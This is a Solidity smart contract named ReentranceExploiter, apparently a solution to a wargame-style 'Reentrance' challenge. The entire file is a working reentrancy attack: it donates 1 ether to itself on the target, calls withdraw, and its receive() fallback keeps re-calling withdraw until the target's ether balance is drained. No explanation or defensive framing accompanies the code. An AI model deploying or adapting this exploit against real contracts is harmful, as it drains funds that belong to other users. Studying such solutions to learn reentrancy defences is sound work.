// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';

interface IReentrance {
    function donate(address _to) external payable;
    function balanceOf(address _who) external view returns (uint balance);
    function withdraw(uint _amount) external;
    receive() external payable;
}

contract ReentranceExploiter {
    IReentrance public instance;

    constructor(address _instance) public payable {
        instance = IReentrance(payable(_instance));
    }

    function exploit() public payable {
        require(msg.value >= 1 ether);
        instance.donate{value: 1 ether}(address(this));
        instance.withdraw(1 ether);
    }

    receive() external payable {
        if (address(instance).balance >= 1 ether) {
            instance.withdraw(1 ether);
        }
    }
}